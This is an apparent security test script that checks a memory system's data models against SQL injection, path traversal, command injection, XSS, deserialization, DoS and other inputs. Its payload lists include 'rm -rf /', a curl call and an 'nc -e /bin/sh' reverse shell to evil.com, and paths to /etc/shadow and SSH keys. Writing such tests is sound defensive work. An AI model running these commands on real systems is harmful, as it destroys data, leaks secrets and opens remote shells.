#!/usr/bin/env python3
"""
üî• COMPREHENSIVE VULNERABILITY SCANNER üî•
Find every goddamn vulnerability in the memory systems.
Be an asshole dev - test everything that could possibly break.
"""

import gc
import json
import os
import sys
import tempfile
import threading
import time
import traceback
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any, Dict, List, Optional

import numpy as np

# Add the memory directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from chunker import ContentChunker
    from embeddings import EmbeddingModel, get_embedding_model
    from graph_models import (
        EntityType,
        GraphEntity,
        GraphRelationship,
        RelationType,
        SubGraph,
    )
    from models import MemoryChunk, MemoryType
    from vector_store import VectorMemory
except ImportError as e:
    print(f"‚ùå Import failed: {e}")
    sys.exit(1)


class ComprehensiveVulnerabilityScanner:
    """Scan for every possible vulnerability."""

    def __init__(self):
        self.vulnerabilities = []
        self.warnings = []
        self.passed = []
        self.test_count = 0
        self.start_time = time.time()

    def log_vulnerability(
        self, test_name: str, description: str, severity: str = "CRITICAL"
    ):
        """Log a vulnerability."""
        self.vulnerabilities.append(
            {
                "test": test_name,
                "description": description,
                "severity": severity,
                "traceback": traceback.format_exc(),
            }
        )
        print(f"üö® {severity} VULNERABILITY in {test_name}: {description}")

    def log_warning(self, test_name: str, description: str):
        """Log a warning."""
        self.warnings.append({"test": test_name, "description": description})
        print(f"‚ö†Ô∏è WARNING in {test_name}: {description}")

    def log_pass(self, test_name: str, description: str):
        """Log a passed test."""
        self.passed.append({"test": test_name, "description": description})
        print(f"‚úÖ PASSED {test_name}: {description}")

    def test_1_sql_injection_attacks(self):
        """Test SQL injection vulnerabilities."""
        print("\nüîç Test 1: SQL Injection Attacks")
        self.test_count += 1

        try:
            # Test malicious SQL in IDs
            malicious_ids = [
                "'; DROP TABLE memory_chunks; --",
                "' OR '1'='1",
                "1' UNION SELECT * FROM users --",
                "'; DELETE FROM memory_chunks; --",
                "'; INSERT INTO memory_chunks VALUES ('hack'); --",
            ]

            for malicious_id in malicious_ids:
                try:
                    chunk = MemoryChunk(
                        id=malicious_id,
                        workspace_id="test-ws",
                        content="test content",
                        memory_type=MemoryType.FOUNDATION,
                    )

                    # Check if malicious ID is sanitized
                    if "'" in chunk.id or ";" in chunk.id:
                        self.log_vulnerability(
                            "SQL_INJECTION",
                            f"Malicious SQL not sanitized in ID: {malicious_id}",
                        )
                    else:
                        self.log_pass("SQL_INJECTION", f"ID sanitized: {malicious_id}")

                except Exception as e:
                    if "SQL" in str(e).upper() or "DROP" in str(e).upper():
                        self.log_vulnerability(
                            "SQL_INJECTION", f"SQL injection succeeded: {e}"
                        )
                    else:
                        self.log_pass("SQL_INJECTION", f"Malicious ID rejected: {e}")

            # Test SQL injection in workspace_id
            malicious_workspace = "'; DROP TABLE workspaces; --"
            try:
                entity = GraphEntity(
                    id="test-entity",
                    workspace_id=malicious_workspace,
                    entity_type=EntityType.COMPANY,
                    name="Test Entity",
                )

                if "'" in entity.workspace_id or ";" in entity.workspace_id:
                    self.log_vulnerability(
                        "SQL_INJECTION",
                        f"Malicious SQL not sanitized in workspace_id: {malicious_workspace}",
                    )
                else:
                    self.log_pass(
                        "SQL_INJECTION",
                        f"Workspace ID sanitized: {malicious_workspace}",
                    )

            except Exception as e:
                self.log_pass("SQL_INJECTION", f"Malicious workspace rejected: {e}")

        except Exception as e:
            self.log_vulnerability("SQL_INJECTION", f"Test failed: {e}")

    def test_2_buffer_overflow_attacks(self):
        """Test buffer overflow vulnerabilities."""
        print("\nüîç Test 2: Buffer Overflow Attacks")
        self.test_count += 1

        try:
            # Test extremely long strings
            long_string = "A" * 1000000  # 1MB string
            very_long_string = "A" * 10000000  # 10MB string

            # Test long content in MemoryChunk
            try:
                chunk = MemoryChunk(
                    id="test-chunk",
                    workspace_id="test-ws",
                    content=very_long_string,
                    memory_type=MemoryType.FOUNDATION,
                )

                # Check if it handles large content
                if len(chunk.content) > 1000000:
                    self.log_pass(
                        "BUFFER_OVERFLOW",
                        f"Handles large content: {len(chunk.content)} chars",
                    )
                else:
                    self.log_warning("BUFFER_OVERFLOW", "Content may be truncated")

            except MemoryError:
                self.log_vulnerability(
                    "BUFFER_OVERFLOW", "MemoryError with large content"
                )
            except Exception as e:
                self.log_pass("BUFFER_OVERFLOW", f"Large content rejected: {e}")

            # Test long entity names
            try:
                entity = GraphEntity(
                    id="test-entity",
                    workspace_id="test-ws",
                    entity_type=EntityType.COMPANY,
                    name=long_string,
                )

                if len(entity.name) > 100000:
                    self.log_warning(
                        "BUFFER_OVERFLOW", "Entity name not limited in size"
                    )
                else:
                    self.log_pass("BUFFER_OVERFLOW", "Entity name size limited")

            except Exception as e:
                self.log_pass("BUFFER_OVERFLOW", f"Long entity name rejected: {e}")

            # Test long property values
            try:
                rel = GraphRelationship(
                    id="test-rel",
                    workspace_id="test-ws",
                    source_id="entity1",
                    target_id="entity2",
                    relation_type=RelationType.RELATED_TO,
                    properties={"long_value": very_long_string},
                )

                if len(str(rel.properties)) > 1000000:
                    self.log_warning(
                        "BUFFER_OVERFLOW", "Properties not limited in size"
                    )
                else:
                    self.log_pass("BUFFER_OVERFLOW", "Properties size limited")

            except Exception as e:
                self.log_pass("BUFFER_OVERFLOW", f"Long properties rejected: {e}")

        except Exception as e:
            self.log_vulnerability("BUFFER_OVERFLOW", f"Test failed: {e}")

    def test_3_path_traversal_attacks(self):
        """Test path traversal vulnerabilities."""
        print("\nüîç Test 3: Path Traversal Attacks")
        self.test_count += 1

        try:
            # Test path traversal in workspace_id
            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "C:\\Windows\\System32\\config\\SAM",
                "../../root/.ssh/id_rsa",
                "..%2F..%2F..%2Fetc%2Fpasswd",
            ]

            for malicious_path in malicious_paths:
                try:
                    chunk = MemoryChunk(
                        id="test-chunk",
                        workspace_id=malicious_path,
                        content="test content",
                        memory_type=MemoryType.FOUNDATION,
                    )

                    # Check if path is sanitized
                    if (
                        ".." in chunk.workspace_id
                        or "/" in chunk.workspace_id
                        or "\\" in chunk.workspace_id
                    ):
                        self.log_vulnerability(
                            "PATH_TRAVERSAL",
                            f"Path traversal not sanitized: {malicious_path}",
                        )
                    else:
                        self.log_pass(
                            "PATH_TRAVERSAL", f"Path sanitized: {malicious_path}"
                        )

                except Exception as e:
                    self.log_pass("PATH_TRAVERSAL", f"Malicious path rejected: {e}")

        except Exception as e:
            self.log_vulnerability("PATH_TRAVERSAL", f"Test failed: {e}")

    def test_4_command_injection_attacks(self):
        """Test command injection vulnerabilities."""
        print("\nüîç Test 4: Command Injection Attacks")
        self.test_count += 1

        try:
            # Test command injection in content
            malicious_commands = [
                "; rm -rf /",
                "| cat /etc/passwd",
                "& curl http://evil.com/steal",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
            ]

            for command in malicious_commands:
                try:
                    chunk = MemoryChunk(
                        id="test-chunk",
                        workspace_id="test-ws",
                        content=f"test content {command}",
                        memory_type=MemoryType.FOUNDATION,
                    )

                    # Check if command is executed (would show in content)
                    if "root:" in chunk.content or "uid=" in chunk.content:
                        self.log_vulnerability(
                            "COMMAND_INJECTION", f"Command executed: {command}"
                        )
                    else:
                        self.log_pass(
                            "COMMAND_INJECTION", f"Command not executed: {command}"
                        )

                except Exception as e:
                    self.log_pass(
                        "COMMAND_INJECTION", f"Malicious command rejected: {e}"
                    )

        except Exception as e:
            self.log_vulnerability("COMMAND_INJECTION", f"Test failed: {e}")

    def test_5_xss_attacks(self):
        """Test XSS vulnerabilities."""
        print("\nüîç Test 5: XSS Attacks")
        self.test_count += 1

        try:
            # Test XSS in content
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')>",
            ]

            for payload in xss_payloads:
                try:
                    chunk = MemoryChunk(
                        id="test-chunk",
                        workspace_id="test-ws",
                        content=payload,
                        memory_type=MemoryType.FOUNDATION,
                    )

                    # Check if script tags are sanitized
                    if "<script>" in chunk.content or "javascript:" in chunk.content:
                        self.log_vulnerability(
                            "XSS", f"XSS payload not sanitized: {payload}"
                        )
                    else:
                        self.log_pass("XSS", f"XSS payload sanitized: {payload}")

                except Exception as e:
                    self.log_pass("XSS", f"XSS payload rejected: {e}")

            # Test XSS in entity names
            try:
                entity = GraphEntity(
                    id="test-entity",
                    workspace_id="test-ws",
                    entity_type=EntityType.COMPANY,
                    name="<script>alert('XSS')</script>",
                )

                if "<script>" in entity.name:
                    self.log_vulnerability("XSS", "XSS in entity name not sanitized")
                else:
                    self.log_pass("XSS", "XSS in entity name sanitized")

            except Exception as e:
                self.log_pass("XSS", f"XSS in entity name rejected: {e}")

        except Exception as e:
            self.log_vulnerability("XSS", f"Test failed: {e}")

    def test_6_deserialization_attacks(self):
        """Test deserialization vulnerabilities."""
        print("\nüîç Test 6: Deserialization Attacks")
        self.test_count += 1

        try:
            # Test malicious JSON
            malicious_jsons = [
                '{"__class__": "os.system", "__module__": "os", "__args__": ["rm -rf /"]}',
                '{"__reduce__": ["os.system", ["rm -rf /"]]}',
                '{"__import__": "subprocess", "__call__": ["Popen", ["rm -rf /"]]}',
            ]

            for malicious_json in malicious_jsons:
                try:
                    # Try to deserialize
                    data = json.loads(malicious_json)

                    # Try to create objects with malicious data
                    chunk = MemoryChunk(
                        id="test-chunk",
                        workspace_id="test-ws",
                        content="test content",
                        memory_type=MemoryType.FOUNDATION,
                        metadata=data,
                    )

                    # Check if dangerous attributes are present
                    if "__class__" in str(chunk.metadata) or "__reduce__" in str(
                        chunk.metadata
                    ):
                        self.log_vulnerability(
                            "DESERIALIZATION",
                            f"Malicious JSON not sanitized: {malicious_json}",
                        )
                    else:
                        self.log_pass(
                            "DESERIALIZATION",
                            f"Malicious JSON sanitized: {malicious_json}",
                        )

                except Exception as e:
                    self.log_pass("DESERIALIZATION", f"Malicious JSON rejected: {e}")

        except Exception as e:
            self.log_vulnerability("DESERIALIZATION", f"Test failed: {e}")

    def test_7_race_condition_attacks(self):
        """Test race condition vulnerabilities."""
        print("\nüîç Test 7: Race Condition Attacks")
        self.test_count += 1

        try:
            # Test concurrent access to same entity
            entity_id = "race-test-entity"
            workspace_id = "race-test-ws"

            def create_entity(thread_id):
                try:
                    entity = GraphEntity(
                        id=entity_id,
                        workspace_id=workspace_id,
                        entity_type=EntityType.COMPANY,
                        name=f"Entity {thread_id}",
                    )
                    return entity
                except Exception as e:
                    return e

            # Create multiple entities concurrently
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(create_entity, i) for i in range(10)]
                results = [future.result() for future in as_completed(futures)]

            # Check for race conditions
            errors = [r for r in results if isinstance(r, Exception)]
            entities = [r for r in results if not isinstance(r, Exception)]

            if len(errors) > 0:
                self.log_warning(
                    "RACE_CONDITION", f"Concurrent access errors: {len(errors)}"
                )

            if len(entities) > 1:
                self.log_warning(
                    "RACE_CONDITION", f"Multiple entities created: {len(entities)}"
                )
            else:
                self.log_pass("RACE_CONDITION", "Concurrent access handled correctly")

        except Exception as e:
            self.log_vulnerability("RACE_CONDITION", f"Test failed: {e}")

    def test_8_memory_leak_attacks(self):
        """Test memory leak vulnerabilities."""
        print("\nüîç Test 8: Memory Leak Attacks")
        self.test_count += 1

        try:
            # Get initial memory usage
            gc.collect()
            initial_objects = len(gc.get_objects())

            # Create lots of objects
            chunks = []
            entities = []
            relationships = []

            for i in range(1000):
                chunk = MemoryChunk(
                    id=f"chunk-{i}",
                    workspace_id="test-ws",
                    content=f"Content {i}" * 100,
                    memory_type=MemoryType.FOUNDATION,
                )
                chunks.append(chunk)

                entity = GraphEntity(
                    id=f"entity-{i}",
                    workspace_id="test-ws",
                    entity_type=EntityType.COMPANY,
                    name=f"Entity {i}",
                )
                entities.append(entity)

                rel = GraphRelationship(
                    id=f"rel-{i}",
                    workspace_id="test-ws",
                    source_id=f"entity-{i}",
                    target_id=f"entity-{(i+1)%1000}",
                    relation_type=RelationType.RELATED_TO,
                )
                relationships.append(rel)

            # Check memory usage
            peak_objects = len(gc.get_objects())

            # Clear references
            chunks.clear()
            entities.clear()
            relationships.clear()

            # Force garbage collection
            gc.collect()
            final_objects = len(gc.get_objects())

            # Check for memory leaks
            memory_growth = final_objects - initial_objects
            if memory_growth > 10000:  # Allow some growth
                self.log_vulnerability(
                    "MEMORY_LEAK", f"Memory leak detected: {memory_growth} objects"
                )
            else:
                self.log_pass(
                    "MEMORY_LEAK", f"Memory usage stable: {memory_growth} objects"
                )

        except Exception as e:
            self.log_vulnerability("MEMORY_LEAK", f"Test failed: {e}")

    def test_9_privilege_escalation_attacks(self):
        """Test privilege escalation vulnerabilities."""
        print("\nüîç Test 9: Privilege Escalation Attacks")
        self.test_count += 1

        try:
            # Test workspace boundary violations
            ws1_entity = GraphEntity(
                id="ws1-entity",
                workspace_id="ws1",
                entity_type=EntityType.COMPANY,
                name="WS1 Entity",
            )

            ws2_entity = GraphEntity(
                id="ws2-entity",
                workspace_id="ws2",
                entity_type=EntityType.COMPANY,
                name="WS2 Entity",
            )

            # Try to create cross-workspace relationship
            cross_ws_rel = GraphRelationship(
                id="cross-ws-rel",
                workspace_id="ws1",  # Claim to be in ws1
                source_id="ws1-entity",
                target_id="ws2-entity",  # But target is in ws2
                relation_type=RelationType.RELATED_TO,
            )

            # Check if boundary violation is detected
            if cross_ws_rel.is_valid(ws1_entity, ws2_entity):
                self.log_vulnerability(
                    "PRIVILEGE_ESCALATION", "Cross-workspace relationship allowed"
                )
            else:
                self.log_pass(
                    "PRIVILEGE_ESCALATION", "Cross-workspace relationship blocked"
                )

            # Test workspace ID spoofing
            spoofed_entity = GraphEntity(
                id="spoofed-entity",
                workspace_id="admin-workspace",  # Try to access admin workspace
                entity_type=EntityType.COMPANY,
                name="Spoofed Entity",
            )

            if spoofed_entity.workspace_id == "admin-workspace":
                self.log_warning("PRIVILEGE_ESCALATION", "Workspace ID not validated")
            else:
                self.log_pass("PRIVILEGE_ESCALATION", "Workspace ID validation works")

        except Exception as e:
            self.log_vulnerability("PRIVILEGE_ESCALATION", f"Test failed: {e}")

    def test_10_dos_attacks(self):
        """Test DoS vulnerabilities."""
        print("\nüîç Test 10: DoS Attacks")
        self.test_count += 1

        try:
            # Test CPU exhaustion
            start_time = time.time()

            # Create complex nested structures
            def create_deep_nesting(depth):
                if depth <= 0:
                    return "leaf"
                return {"level": depth, "nested": create_deep_nesting(depth - 1)}

            deep_structure = create_deep_nesting(1000)

            try:
                chunk = MemoryChunk(
                    id="dos-chunk",
                    workspace_id="test-ws",
                    content="test content",
                    memory_type=MemoryType.FOUNDATION,
                    metadata=deep_structure,
                )

                processing_time = time.time() - start_time
                if processing_time > 5.0:  # 5 second limit
                    self.log_vulnerability(
                        "DOS", f"CPU exhaustion: {processing_time:.2f}s"
                    )
                else:
                    self.log_pass(
                        "DOS", f"Processing time acceptable: {processing_time:.2f}s"
                    )

            except Exception as e:
                self.log_pass("DOS", f"Complex structure rejected: {e}")

            # Test memory exhaustion
            try:
                # Create huge list
                huge_list = [i for i in range(1000000)]

                chunk = MemoryChunk(
                    id="memory-dos-chunk",
                    workspace_id="test-ws",
                    content="test content",
                    memory_type=MemoryType.FOUNDATION,
                    metadata={"huge_list": huge_list},
                )

                self.log_warning("DOS", "Large metadata lists not limited")

            except MemoryError:
                self.log_pass("DOS", "Memory exhaustion prevented")
            except Exception as e:
                self.log_pass("DOS", f"Huge metadata rejected: {e}")

        except Exception as e:
            self.log_vulnerability("DOS", f"Test failed: {e}")

    def test_11_type_confusion_attacks(self):
        """Test type confusion vulnerabilities."""
        print("\nüîç Test 11: Type Confusion Attacks")
        self.test_count += 1

        try:
            # Test wrong types in enum fields
            try:
                chunk = MemoryChunk(
                    id="type-confusion-chunk",
                    workspace_id="test-ws",
                    content="test content",
                    memory_type="INVALID_TYPE",  # Should be enum
                )

                self.log_warning("TYPE_CONFUSION", "Invalid enum type accepted")

            except Exception as e:
                self.log_pass("TYPE_CONFUSION", f"Invalid enum type rejected: {e}")

            # Test wrong types in numeric fields
            try:
                rel = GraphRelationship(
                    id="type-confusion-rel",
                    workspace_id="test-ws",
                    source_id="entity1",
                    target_id="entity2",
                    relation_type=RelationType.RELATED_TO,
                    weight="not_a_number",  # Should be numeric
                )

                # Check if weight is normalized
                if isinstance(rel.weight, (int, float)):
                    self.log_pass("TYPE_CONFUSION", "Weight type normalized")
                else:
                    self.log_vulnerability(
                        "TYPE_CONFUSION",
                        f"Weight type not normalized: {type(rel.weight)}",
                    )

            except Exception as e:
                self.log_pass("TYPE_CONFUSION", f"Invalid weight type rejected: {e}")

        except Exception as e:
            self.log_vulnerability("TYPE_CONFUSION", f"Test failed: {e}")

    def test_12_information_disclosure_attacks(self):
        """Test information disclosure vulnerabilities."""
        print("\nüîç Test 12: Information Disclosure Attacks")
        self.test_count += 1

        try:
            # Test sensitive data in metadata
            sensitive_data = {
                "password": "secret123",
                "api_key": "sk-1234567890",
                "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...",
                "session_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
            }

            try:
                chunk = MemoryChunk(
                    id="sensitive-chunk",
                    workspace_id="test-ws",
                    content="test content",
                    memory_type=MemoryType.FOUNDATION,
                    metadata=sensitive_data,
                )

                # Check if sensitive data is exposed in string representation
                chunk_str = str(chunk)
                if "secret123" in chunk_str or "sk-1234567890" in chunk_str:
                    self.log_vulnerability(
                        "INFORMATION_DISCLOSURE",
                        "Sensitive data exposed in string representation",
                    )
                else:
                    self.log_pass(
                        "INFORMATION_DISCLOSURE",
                        "Sensitive data not exposed in string representation",
                    )

                # Check if sensitive data is exposed in dict representation
                chunk_dict = chunk.to_dict()
                if "password" in str(chunk_dict) or "api_key" in str(chunk_dict):
                    self.log_warning(
                        "INFORMATION_DISCLOSURE", "Sensitive data present in dictionary"
                    )
                else:
                    self.log_pass(
                        "INFORMATION_DISCLOSURE",
                        "Sensitive data filtered from dictionary",
                    )

            except Exception as e:
                self.log_pass("INFORMATION_DISCLOSURE", f"Sensitive data rejected: {e}")

        except Exception as e:
            self.log_vulnerability("INFORMATION_DISCLOSURE", f"Test failed: {e}")

    def run_all_tests(self):
        """Run all vulnerability tests."""
        print("=" * 80)
        print("üî• COMPREHENSIVE VULNERABILITY SCANNER üî•")
        print("Finding every goddamn vulnerability in the memory systems")
        print("=" * 80)

        # Run all tests
        self.test_1_sql_injection_attacks()
        self.test_2_buffer_overflow_attacks()
        self.test_3_path_traversal_attacks()
        self.test_4_command_injection_attacks()
        self.test_5_xss_attacks()
        self.test_6_deserialization_attacks()
        self.test_7_race_condition_attacks()
        self.test_8_memory_leak_attacks()
        self.test_9_privilege_escalation_attacks()
        self.test_10_dos_attacks()
        self.test_11_type_confusion_attacks()
        self.test_12_information_disclosure_attacks()

        # Print summary
        self.print_summary()

    def print_summary(self):
        """Print test summary."""
        end_time = time.time()
        duration = end_time - self.start_time

        print("\n" + "=" * 80)
        print("üìä COMPREHENSIVE VULNERABILITY SCAN SUMMARY")
        print("=" * 80)

        print(f"‚è±Ô∏è Duration: {duration:.2f} seconds")
        print(f"üîç Tests Run: {self.test_count}")
        print(f"üö® Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"‚ö†Ô∏è Warnings: {len(self.warnings)}")
        print(f"‚úÖ Passed: {len(self.passed)}")

        if self.vulnerabilities:
            print("\nüö® CRITICAL VULNERABILITIES FOUND:")
            for vuln in self.vulnerabilities:
                print(
                    f"  üí• {vuln['severity']} in {vuln['test']}: {vuln['description']}"
                )

        if self.warnings:
            print("\n‚ö†Ô∏è WARNINGS:")
            for warning in self.warnings:
                print(f"  ‚ö†Ô∏è {warning['test']}: {warning['description']}")

        if not self.vulnerabilities:
            print("\nüéâ NO CRITICAL VULNERABILITIES FOUND!")
            print("üõ°Ô∏è System appears to be secure against tested attacks")
        else:
            print(
                f"\nüö® {len(self.vulnerabilities)} CRITICAL VULNERABILITIES REQUIRE IMMEDIATE ATTENTION!"
            )

        print("=" * 80)

        # Return status
        return len(self.vulnerabilities) == 0


if __name__ == "__main__":
    scanner = ComprehensiveVulnerabilityScanner()
    success = scanner.run_all_tests()
    sys.exit(0 if success else 1)
